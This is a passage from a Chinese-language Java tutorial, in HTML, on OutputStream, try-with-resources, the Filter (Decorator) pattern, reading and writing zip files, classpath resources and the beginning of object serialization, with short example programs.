class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public void writeFile() throws IOException &#123;</span><br><span class="line">    OutputStream output &#x3D; new FileOutputStream(&quot;out&#x2F;readme.txt&quot;);</span><br><span class="line">    output.write(&quot;Hello&quot;.getBytes(&quot;UTF-8&quot;)); &#x2F;&#x2F; Hello</span><br><span class="line">    output.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和<code>InputStream</code>一样，上述代码没有考虑到在发生异常的情况下如何正确地关闭资源。写入过程也会经常发生IO错误，例如，磁盘已满，无权限写入等等。我们需要用<code>try(resource)</code>来保证<code>OutputStream</code>在无论是否发生IO错误的时候都能够正确地关闭：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public void writeFile() throws IOException &#123;</span><br><span class="line">    try (OutputStream output &#x3D; new FileOutputStream(&quot;out&#x2F;readme.txt&quot;)) &#123;</span><br><span class="line">        output.write(&quot;Hello&quot;.getBytes(&quot;UTF-8&quot;)); &#x2F;&#x2F; Hello</span><br><span class="line">    &#125; &#x2F;&#x2F; 编译器在此自动为我们写入finally并调用close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="阻塞-1"><a href="#阻塞-1" class="headerlink" title="阻塞"></a>阻塞</h3><p>和<code>InputStream</code>一样，<code>OutputStream</code>的<code>write()</code>方法也是阻塞的。</p><h3 id="OutputStream实现类"><a href="#OutputStream实现类" class="headerlink" title="OutputStream实现类"></a>OutputStream实现类</h3><p>用<code>FileOutputStream</code>可以从文件获取输出流，这是<code>OutputStream</code>常用的一个实现类。此外，<code>ByteArrayOutputStream</code>可以在内存中模拟一个<code>OutputStream</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] data;</span><br><span class="line">        <span class="keyword">try</span> (ByteArrayOutputStream output = <span class="keyword">new</span> ByteArrayOutputStream()) &#123;</span><br><span class="line">            output.write(<span class="string">"Hello "</span>.getBytes(<span class="string">"UTF-8"</span>));</span><br><span class="line">            output.write(<span class="string">"world!"</span>.getBytes(<span class="string">"UTF-8"</span>));</span><br><span class="line">            data = output.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(data, <span class="string">"UTF-8"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ByteArrayOutputStream</code>实际上是把一个<code>byte[]</code>数组在内存中变成一个<code>OutputStream</code>，虽然实际应用不多，但测试的时候，可以用它来构造一个<code>OutputStream</code>。</p><p>同时操作多个<code>AutoCloseable</code>资源时，在<code>try(resource) { ... }</code>语句中可以同时写出多个资源，用<code>;</code>隔开。例如，同时读写两个文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 读取input.txt，写入output.txt:</span><br><span class="line">try (InputStream input &#x3D; new FileInputStream(&quot;input.txt&quot;);</span><br><span class="line">     OutputStream output &#x3D; new FileOutputStream(&quot;output.txt&quot;))</span><br><span class="line">&#123;</span><br><span class="line">    input.transferTo(output); &#x2F;&#x2F; transferTo的作用是?</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h3><p>Java标准库的<code>java.io.OutputStream</code>定义了所有输出流的超类：</p><ul><li><code>FileOutputStream</code>实现了文件流输出；</li><li><code>ByteArrayOutputStream</code>在内存中模拟一个字节流输出。</li></ul><p>某些情况下需要手动调用<code>OutputStream</code>的<code>flush()</code>方法来强制输出缓冲区。</p><p>总是使用<code>try(resource)</code>来保证<code>OutputStream</code>正确关闭。</p><h1 id="Filter模式"><a href="#Filter模式" class="headerlink" title="Filter模式"></a>Filter模式</h1><p>Java的IO标准库提供的<code>InputStream</code>根据来源可以包括：</p><ul><li><code>FileInputStream</code>：从文件读取数据，是最终数据源；</li><li><code>ServletInputStream</code>：从HTTP请求读取数据，是最终数据源；</li><li><code>Socket.getInputStream()</code>：从TCP连接读取数据，是最终数据源；</li><li>…</li></ul><p>如果我们要给<code>FileInputStream</code>添加缓冲功能，则可以从<code>FileInputStream</code>派生一个类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BufferedFileInputStream extends FileInputStream</span><br></pre></td></tr></table></figure><p>如果要给<code>FileInputStream</code>添加计算签名的功能，类似的，也可以从<code>FileInputStream</code>派生一个类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DigestFileInputStream extends FileInputStream</span><br></pre></td></tr></table></figure><p>如果要给<code>FileInputStream</code>添加加密/解密功能，还是可以从<code>FileInputStream</code>派生一个类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CipherFileInputStream extends FileInputStream</span><br></pre></td></tr></table></figure><p>如果要给<code>FileInputStream</code>添加缓冲和签名的功能，那么我们还需要派生<code>BufferedDigestFileInputStream</code>。如果要给<code>FileInputStream</code>添加缓冲和加解密的功能，则需要派生<code>BufferedCipherFileInputStream</code>。</p><p>我们发现，给<code>FileInputStream</code>添加3种功能，至少需要3个子类。这3种功能的组合，又需要更多的子类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">                          ┌─────────────────┐</span><br><span class="line">                          │ FileInputStream │</span><br><span class="line">                          └─────────────────┘</span><br><span class="line">                                   ▲</span><br><span class="line">             ┌───────────┬─────────┼─────────┬───────────┐</span><br><span class="line">             │           │         │         │           │</span><br><span class="line">┌───────────────────────┐│┌─────────────────┐│┌─────────────────────┐</span><br><span class="line">│BufferedFileInputStream│││DigestInputStream│││CipherFileInputStream│</span><br><span class="line">└───────────────────────┘│└─────────────────┘│└─────────────────────┘</span><br><span class="line">                         │                   │</span><br><span class="line">    ┌─────────────────────────────┐ ┌─────────────────────────────┐</span><br><span class="line">    │BufferedDigestFileInputStream│ │BufferedCipherFileInputStream│</span><br><span class="line">    └─────────────────────────────┘ └─────────────────────────────┘</span><br></pre></td></tr></table></figure><p>这还只是针对<code>FileInputStream</code>设计，如果针对另一种<code>InputStream</code>设计，很快会出现子类爆炸的情况。</p><p>因此，直接使用继承，为各种<code>InputStream</code>附加更多的功能，根本无法控制代码的复杂度，很快就会失控。</p><p>为了解决依赖继承会导致子类数量失控的问题，JDK首先将<code>InputStream</code>分为两大类：</p><p>一类是直接提供数据的基础<code>InputStream</code>，例如：</p><ul><li>FileInputStream</li><li>ByteArrayInputStream</li><li>ServletInputStream</li><li>…</li></ul><p>一类是提供额外附加功能的<code>InputStream</code>，例如：</p><ul><li>BufferedInputStream</li><li>DigestInputStream</li><li>CipherInputStream</li><li>…</li></ul><p>当我们需要给一个“基础”<code>InputStream</code>附加各种功能时，我们先确定这个能提供数据源的<code>InputStream</code>，因为我们需要的数据总得来自某个地方，例如，<code>FileInputStream</code>，数据来源自文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InputStream file &#x3D; new FileInputStream(&quot;test.gz&quot;);</span><br></pre></td></tr></table></figure><p>紧接着，我们希望<code>FileInputStream</code>能提供缓冲的功能来提高读取的效率，因此我们用<code>BufferedInputStream</code>包装这个<code>InputStream</code>，得到的包装类型是<code>BufferedInputStream</code>，但它仍然被视为一个<code>InputStream</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InputStream buffered &#x3D; new BufferedInputStream(file);</span><br></pre></td></tr></table></figure><p>最后，假设该文件已经用gzip压缩了，我们希望直接读取解压缩的内容，就可以再包装一个<code>GZIPInputStream</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InputStream gzip &#x3D; new GZIPInputStream(buffered);</span><br></pre></td></tr></table></figure><p>无论我们包装多少次，得到的对象始终是<code>InputStream</code>，我们直接用<code>InputStream</code>来引用它，就可以正常读取：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────────────────┐</span><br><span class="line">│GZIPInputStream          │</span><br><span class="line">│┌───────────────────────┐│</span><br><span class="line">││BufferedFileInputStream││</span><br><span class="line">││┌─────────────────────┐││</span><br><span class="line">│││   FileInputStream   │││</span><br><span class="line">││└─────────────────────┘││</span><br><span class="line">│└───────────────────────┘│</span><br><span class="line">└─────────────────────────┘</span><br></pre></td></tr></table></figure><p>上述这种通过一个“基础”组件再叠加各种“附加”功能组件的模式，称之为Filter模式（或者装饰器模式：Decorator）。它可以让我们通过少量的类来实现各种功能的组合：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">                 ┌─────────────┐</span><br><span class="line">                 │ InputStream │</span><br><span class="line">                 └─────────────┘</span><br><span class="line">                       ▲ ▲</span><br><span class="line">┌────────────────────┐ │ │ ┌─────────────────┐</span><br><span class="line">│  FileInputStream   │─┤ └─│FilterInputStream│</span><br><span class="line">└────────────────────┘ │   └─────────────────┘</span><br><span class="line">┌────────────────────┐ │     ▲ ┌───────────────────┐</span><br><span class="line">│ByteArrayInputStream│─┤     ├─│BufferedInputStream│</span><br><span class="line">└────────────────────┘ │     │ └───────────────────┘</span><br><span class="line">┌────────────────────┐ │     │ ┌───────────────────┐</span><br><span class="line">│ ServletInputStream │─┘     ├─│  DataInputStream  │</span><br><span class="line">└────────────────────┘       │ └───────────────────┘</span><br><span class="line">                             │ ┌───────────────────┐</span><br><span class="line">                             └─│CheckedInputStream │</span><br><span class="line">                               └───────────────────┘</span><br></pre></td></tr></table></figure><p>类似的，<code>OutputStream</code>也是以这种模式来提供各种功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">                  ┌─────────────┐</span><br><span class="line">                  │OutputStream │</span><br><span class="line">                  └─────────────┘</span><br><span class="line">                        ▲ ▲</span><br><span class="line">┌─────────────────────┐ │ │ ┌──────────────────┐</span><br><span class="line">│  FileOutputStream   │─┤ └─│FilterOutputStream│</span><br><span class="line">└─────────────────────┘ │   └──────────────────┘</span><br><span class="line">┌─────────────────────┐ │     ▲ ┌────────────────────┐</span><br><span class="line">│ByteArrayOutputStream│─┤     ├─│BufferedOutputStream│</span><br><span class="line">└─────────────────────┘ │     │ └────────────────────┘</span><br><span class="line">┌─────────────────────┐ │     │ ┌────────────────────┐</span><br><span class="line">│ ServletOutputStream │─┘     ├─│  DataOutputStream  │</span><br><span class="line">└─────────────────────┘       │ └────────────────────┘</span><br><span class="line">                              │ ┌────────────────────┐</span><br><span class="line">                              └─│CheckedOutputStream │</span><br><span class="line">                                └────────────────────┘</span><br></pre></td></tr></table></figure><h3 id="编写FilterInputStream"><a href="#编写FilterInputStream" class="headerlink" title="编写FilterInputStream"></a>编写FilterInputStream</h3><p>我们也可以自己编写<code>FilterInputStream</code>，以便可以把自己的<code>FilterInputStream</code>“叠加”到任何一个<code>InputStream</code>中。</p><p>下面的例子演示了如何编写一个<code>CountInputStream</code>，它的作用是对输入的字节进行计数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] data = <span class="string">"hello, world!"</span>.getBytes(<span class="string">"UTF-8"</span>);</span><br><span class="line">        <span class="keyword">try</span> (CountInputStream input = <span class="keyword">new</span> CountInputStream(<span class="keyword">new</span> ByteArrayInputStream(data))) &#123;</span><br><span class="line">            <span class="keyword">int</span> n;</span><br><span class="line">            <span class="keyword">while</span> ((n = input.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">                System.out.println((<span class="keyword">char</span>)n);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">"Total read "</span> + input.getBytesRead() + <span class="string">" bytes"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CountInputStream</span> <span class="keyword">extends</span> <span class="title">FilterInputStream</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    CountInputStream(InputStream in) &#123;</span><br><span class="line">        <span class="keyword">super</span>(in);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getBytesRead</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.count;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = in.read();</span><br><span class="line">        <span class="keyword">if</span> (n != -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.count ++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">(<span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = in.read(b, off, len);</span><br><span class="line">        <span class="keyword">if</span> (n != -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.count += n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到在叠加多个<code>FilterInputStream</code>，我们只需要持有最外层的<code>InputStream</code>，并且，当最外层的<code>InputStream</code>关闭时（在<code>try(resource)</code>块的结束处自动关闭），内层的<code>InputStream</code>的<code>close()</code>方法也会被自动调用，并最终调用到最核心的“基础”<code>InputStream</code>，因此不存在资源泄露。</p><h3 id="小结-3"><a href="#小结-3" class="headerlink" title="小结"></a>小结</h3><p>Java的IO标准库使用Filter模式为<code>InputStream</code>和<code>OutputStream</code>增加功能：</p><ul><li>可以把一个<code>InputStream</code>和任意个<code>FilterInputStream</code>组合；</li><li>可以把一个<code>OutputStream</code>和任意个<code>FilterOutputStream</code>组合。</li></ul><p>Filter模式可以在运行期动态增加功能（又称Decorator模式）。</p><h1 id="操作Zip"><a href="#操作Zip" class="headerlink" title="操作Zip"></a>操作Zip</h1><p><code>ZipInputStream</code>是一种<code>FilterInputStream</code>，它可以直接读取zip包的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌───────────────────┐</span><br><span class="line">│    InputStream    │</span><br><span class="line">└───────────────────┘</span><br><span class="line">          ▲</span><br><span class="line">          │</span><br><span class="line">┌───────────────────┐</span><br><span class="line">│ FilterInputStream │</span><br><span class="line">└───────────────────┘</span><br><span class="line">          ▲</span><br><span class="line">          │</span><br><span class="line">┌───────────────────┐</span><br><span class="line">│InflaterInputStream│</span><br><span class="line">└───────────────────┘</span><br><span class="line">          ▲</span><br><span class="line">          │</span><br><span class="line">┌───────────────────┐</span><br><span class="line">│  ZipInputStream   │</span><br><span class="line">└───────────────────┘</span><br><span class="line">          ▲</span><br><span class="line">          │</span><br><span class="line">┌───────────────────┐</span><br><span class="line">│  JarInputStream   │</span><br><span class="line">└───────────────────┘</span><br></pre></td></tr></table></figure><p>另一个<code>JarInputStream</code>是从<code>ZipInputStream</code>派生，它增加的主要功能是直接读取jar文件里面的<code>MANIFEST.MF</code>文件。因为本质上jar包就是zip包，只是额外附加了一些固定的描述文件。</p><h3 id="读取zip包"><a href="#读取zip包" class="headerlink" title="读取zip包"></a>读取zip包</h3><p>我们来看看<code>ZipInputStream</code>的基本用法。</p><p>我们要创建一个<code>ZipInputStream</code>，通常是传入一个<code>FileInputStream</code>作为数据源，然后，循环调用<code>getNextEntry()</code>，直到返回<code>null</code>，表示zip流结束。</p><p>一个<code>ZipEntry</code>表示一个压缩文件或目录，如果是压缩文件，我们就用<code>read()</code>方法不断读取，直到返回<code>-1</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">try (ZipInputStream zip &#x3D; new ZipInputStream(new FileInputStream(...))) &#123;</span><br><span class="line">    ZipEntry entry &#x3D; null;</span><br><span class="line">    while ((entry &#x3D; zip.getNextEntry()) !&#x3D; null) &#123;</span><br><span class="line">        String name &#x3D; entry.getName();</span><br><span class="line">        if (!entry.isDirectory()) &#123;</span><br><span class="line">            int n;</span><br><span class="line">            while ((n &#x3D; zip.read()) !&#x3D; -1) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="写入zip包"><a href="#写入zip包" class="headerlink" title="写入zip包"></a>写入zip包</h3><p><code>ZipOutputStream</code>是一种<code>FilterOutputStream</code>，它可以直接写入内容到zip包。我们要先创建一个<code>ZipOutputStream</code>，通常是包装一个<code>FileOutputStream</code>，然后，每写入一个文件前，先调用<code>putNextEntry()</code>，然后用<code>write()</code>写入<code>byte[]</code>数据，写入完毕后调用<code>closeEntry()</code>结束这个文件的打包。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">try (ZipOutputStream zip &#x3D; new ZipOutputStream(new FileOutputStream(...))) &#123;</span><br><span class="line">    File[] files &#x3D; ...</span><br><span class="line">    for (File file : files) &#123;</span><br><span class="line">        zip.putNextEntry(new ZipEntry(file.getName()));</span><br><span class="line">        zip.write(getFileDataAsBytes(file));</span><br><span class="line">        zip.closeEntry();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码没有考虑文件的目录结构。如果要实现目录层次结构，<code>new ZipEntry(name)</code>传入的<code>name</code>要用相对路径。</p><h3 id="小结-4"><a href="#小结-4" class="headerlink" title="小结"></a>小结</h3><p><code>ZipInputStream</code>可以读取zip格式的流，<code>ZipOutputStream</code>可以把多份数据写入zip包；</p><p>配合<code>FileInputStream</code>和<code>FileOutputStream</code>就可以读写zip文件。</p><h1 id="读取classpath资源"><a href="#读取classpath资源" class="headerlink" title="读取classpath资源"></a>读取classpath资源</h1><p>很多Java程序启动的时候，都需要读取配置文件。例如，从一个<code>.properties</code>文件中读取配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String conf &#x3D; &quot;C:\\conf\\default.properties&quot;;</span><br><span class="line">try (InputStream input &#x3D; new FileInputStream(conf)) &#123;</span><br><span class="line">    &#x2F;&#x2F; TODO:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码要正常执行，必须在C盘创建<code>conf</code>目录，然后在目录里创建<code>default.properties</code>文件。但是，在Linux系统上，路径和Windows的又不一样。</p><p>因此，从磁盘的固定目录读取配置文件，不是一个好的办法。</p><p>有没有路径无关的读取文件的方式呢？</p><p>我们知道，Java存放<code>.class</code>的目录或jar包也可以包含任意其他类型的文件，例如：</p><ul><li>配置文件，例如<code>.properties</code>；</li><li>图片文件，例如<code>.jpg</code>；</li><li>文本文件，例如<code>.txt</code>，<code>.csv</code>；</li><li>……</li></ul><p>从classpath读取文件就可以避免不同环境下文件路径不一致的问题：如果我们把<code>default.properties</code>文件放到classpath中，就不用关心它的实际存放路径。</p><p>在classpath中的资源文件，路径总是以<code>／</code>开头，我们先获取当前的<code>Class</code>对象，然后调用<code>getResourceAsStream()</code>就可以直接从classpath读取任意的资源文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">try (InputStream input &#x3D; getClass().getResourceAsStream(&quot;&#x2F;default.properties&quot;)) &#123;</span><br><span class="line">    &#x2F;&#x2F; TODO:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用<code>getResourceAsStream()</code>需要特别注意的一点是，如果资源文件不存在，它将返回<code>null</code>。因此，我们需要检查返回的<code>InputStream</code>是否为<code>null</code>，如果为<code>null</code>，表示资源文件在classpath中没有找到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">try (InputStream input &#x3D; getClass().getResourceAsStream(&quot;&#x2F;default.properties&quot;)) &#123;</span><br><span class="line">    if (input !&#x3D; null) &#123;</span><br><span class="line">        &#x2F;&#x2F; TODO:</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们把默认的配置放到jar包中，再从外部文件系统读取一个可选的配置文件，就可以做到既有默认的配置文件，又可以让用户自己修改配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Properties props &#x3D; new Properties();</span><br><span class="line">props.load(inputStreamFromClassPath(&quot;&#x2F;default.properties&quot;));</span><br><span class="line">props.load(inputStreamFromFile(&quot;.&#x2F;conf.properties&quot;));</span><br></pre></td></tr></table></figure><p>这样读取配置文件，应用程序启动就更加灵活。</p><h3 id="小结-5"><a href="#小结-5" class="headerlink" title="小结"></a>小结</h3><p>把资源存储在classpath中可以避免文件路径依赖；</p><p><code>Class</code>对象的<code>getResourceAsStream()</code>可以从classpath中读取指定资源；</p><p>根据classpath读取资源时，需要检查返回的<code>InputStream</code>是否为<code>null</code>。</p><h1 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h1><p>序列化是指把一个Java对象变成二进制内容，本质上就是一个<code>byte[]</code>数组。</p><p>为什么要把Java对象序列化呢？因为序列化后可以把<code>byte[]</code>保存到文件中，或者把<code>byte[]</code>通过网络传输到远程，这样，就相当于把Java对象存储到文件或者通过网络传输出去了。</p><p>有序列化，就有反序列化，即把一个二进制内容（也就是<code>byte[]</code>数组）变回Java对象。有了反序列化，保存到文件中的<code>byte[]</code>数组又可以“变回”Java对象，或者从网络上读取<code>byte[]</code>并把它“变回”Java对象。</p><p>我们来看看如何把一个Java对象序列化。</p><p>一个Java对象要能序列化，必须实现一个特殊的<code>java.io.Serializable</code>接口，它的定义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public interface Serializable &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Serializable</code>接口没有定义任何方法，它是一个空接口。我们把这样的空接口称为“标记接口”（Marker Interface），实现了标记接口的类仅仅是给自身贴了个“标记”，并没有增加任何方法。</p><h3 id="序列化-1"><a href="#序列化-1" class="headerlink" title="序列化"></a>序列化</h3><p>把一个Java对象变为<code>byte[]</code>数组，需要使用<code>ObjectOutputStream</code>。它负责把一个Java对象写入一个字节流：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*; <span class="keyword">import</span> java.util.Arrays; </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ByteArrayOutputStream buffer = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">try</span> (ObjectOutputStream output = <span class="keyword">new</span> ObjectOutputStream(buffer)) &#123;</span><br><span class="line">            <span class="comment">// 写入int:</span></span><br><span class="line">            output.writeInt(<span class="number">12345</span>);</span><br><span class="line">            <span class="comment">// 写入String:</span></span><br><span class="line">            output.writeUTF(<span class="string">"Hello"</span>);</span><br><span class="line">            <span class="comment">// 写入Object:</span></span><br><span class="line">            output.writeObject(Double.valueOf(<span class="number">123.456</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(Arrays.toString(buffer.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ObjectOutputStream</code>既可以写入基本类型，如<code>int</code>，<code>boolean</code>，也可以写入<code>String</code>（以UTF-8编码），还可以写入实现了<code>Serializable</code>接口的<code>Object</code>。</p><p>因为写入<code>Object</code>时需要大量的类型信息，所以写入的内容很大。</p><h3 id="反序列化"><a href="#反序列化" 